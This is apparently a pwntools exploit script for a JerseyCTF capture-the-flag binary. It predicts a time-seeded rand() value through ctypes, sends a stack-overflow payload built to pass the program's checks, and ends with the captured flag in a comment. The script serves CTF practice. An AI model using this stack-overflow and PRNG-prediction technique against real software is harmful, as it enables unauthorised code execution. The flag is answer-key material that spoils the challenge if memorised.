import ctypes
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./fantaxotic_fledgling', '''
    b *(vuln+135)
    continue
''')

# p = remote('fantaxoticfledgling.aws.jerseyctf.com', 1237)

# replicate PRNG srand(time(NULL))
libc = ctypes.CDLL('libc.so.6')
libc.time.argtypes = [ctypes.POINTER(ctypes.c_long)]
libc.srand.argtypes = [ctypes.c_uint]
current_time = ctypes.c_long()
libc.time(ctypes.byref(current_time))
libc.srand(ctypes.c_uint(current_time.value))
libc.rand.restype = ctypes.c_int

# stack overflow to pass checks
temp_val = libc.rand() % 0x64
log.info(f"temp value: {hex(temp_val)}")
p.sendlineafter(b"Send your message: ", b'\0'*(0x88-0x48)+p8(temp_val)+b'\0'*(0x47-0x19)+b'DEADBEEF')

p.interactive()

# jctfv{fant4stic_fl0gging_fl3dge_abc09e190}